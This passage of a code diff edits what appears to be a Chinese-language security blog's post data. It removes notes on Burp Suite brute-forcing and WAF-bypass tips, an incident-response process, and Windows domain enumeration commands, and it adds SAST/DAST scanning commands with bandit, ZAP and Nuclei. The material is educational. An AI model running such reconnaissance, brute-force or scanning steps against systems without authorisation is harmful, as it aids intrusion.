-- 拦截 HTTP/HTTPS 请求
-- 修改请求/响应内容
-- 历史记录查看
+#### Bandit（Python）
 
-### Intruder（入侵者）
-- 自动化参数爆破
-- 支持多种攻击模式：
-  - Sniper：逐个参数
-  - Battering ram：相同值
-  - Pitchfork：多组对应值
-  - Cluster bomb：全组合
-
-### Repeater（重放器）
-- 手动修改并重发请求
-- 测试漏洞 Payload
-
-### Decoder（解码器）
-- URL/Base64/Hex 等编码解码
-
-## 常用技巧
-
-1. **抓包改包**：Proxy → Intercept
-2. **爆破密码**：Intruder → Positions/Payloads
-3. **测试漏洞**：Repeater → 修改参数
-4. **绕过 WAF**：修改 Headers、编码 Payload
-    `
-  },
-  // 应急响应
-  {
-    slug: 'ir-process',
-    title: '应急响应事件处理流程',
-    date: '2026-05-28',
-    category: 'ir',
-    subcategory: 'ir-process',
-    tags: ['应急响应', '安全运营', '事件处理'],
-    summary: '安全事件应急响应的标准处理流程。',
-    content: `
-## 应急响应流程
-
-### 1. 准备阶段
-- 建立应急响应团队
-- 准备工具和环境
-- 制定响应预案
-
-### 2. 检测阶段
-- 确认安全事件
-- 评估影响范围
-- 事件分级分类
-
-### 3. 抑制阶段
-- 隔离受影响系统
-- 阻断攻击路径
-- 保存证据
-
-### 4. 根除阶段
-- 分析攻击手法
-- 清除恶意程序
-- 修复漏洞
-
-### 5. 恢复阶段
-- 恢复系统服务
-- 验证系统安全
-- 监控异常行为
-
-### 6. 总结阶段
-- 编写事件报告
-- 复盘改进措施
-- 更新安全策略
-
-## 常用工具
-
-- **流量分析**：Wireshark, tcpdump
-- **日志分析**：ELK, Splunk
-- **恶意文件**：VirusTotal, 微步在线
-- **系统排查**：Autoruns, Process Explorer
-    `
-  },
-  // 域渗透
-  {
-    slug: 'domain-environment',
-    title: '域环境基础知识',
-    date: '2026-05-25',
-    category: 'domain',
-    subcategory: 'domain-basic',
-    tags: ['域渗透', 'Active Directory', 'Windows'],
-    summary: 'Windows 域环境的基本概念和架构。',
-    content: `
-## 域的基本概念
-
-### 什么是域
-域是 Windows 网络中共享统一目录数据库的计算机集合。
-
-### 域控制器（DC）
-- 存储 Active Directory 数据库
-- 处理身份验证
-- 管理域内资源
-
-### 域内常见组
-- **Domain Admins** - 域管理员
-- **Enterprise Admins** - 企业管理员
-- **Domain Users** - 域用户
-- **Domain Controllers** - 域控制器
-
-## 常用协议
-
-| 协议 | 用途 |
-|------|------|
-| LDAP | 目录访问 |
-| Kerberos | 身份认证 |
-| NTLM | 身份认证 |
-| SMB | 文件共享 |
-| RPC | 远程调用 |
-
-## 域内信息收集
-
-\`\`\`powershell
-# 查看当前域
-net config workstation
-
-# 查看域用户
-net user /domain
-
-# 查看域组
-net group /domain
-
-# 查看域控
-nltest /dclist:domain.com
-
-# DNS 记录
-nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com
+\`\`\`bash
+bandit -r .
 \`\`\`
+
+### 常见发现
+
+- SQL 注入
+- XSS
+- 命令注入
+- 硬编码密码
+- 不安全的随机数
+
+## DAST（动态应用安全测试）
+
+### 特点
+- 测试运行中的应用
+- 模拟攻击者视角
+- 发现运行时漏洞
+- 无需源代码
+
+### 工具
+
+#### OWASP ZAP
+
+\`\`\`bash
+# 扫描
+zap-baseline.py -t http://target.com
+
+# 主动扫描
+zap-full-scan.py -t http://target.com
+\`\`\`
+
+#### Nuclei
+
+\`\`\`bash
+nuclei -u http://target.com -t cves/
+\`\`\`
+
+### 常见发现
+
+- SQL 注入
+- XSS
+- CSRF
+- 信息泄露
+- 配置错误
+
+## SAST vs DAST
+
+| 特性 | SAST | DAST |
+|------|------|------|
+| 分析对象 | 源代码 | 运行应用 |
+| 阶段 | 开发早期 | 测试/生产 |
+| 覆盖率 | 高 | 低 |
+| 误报率 | 较高 | 较低 |
     `
   },
 ]
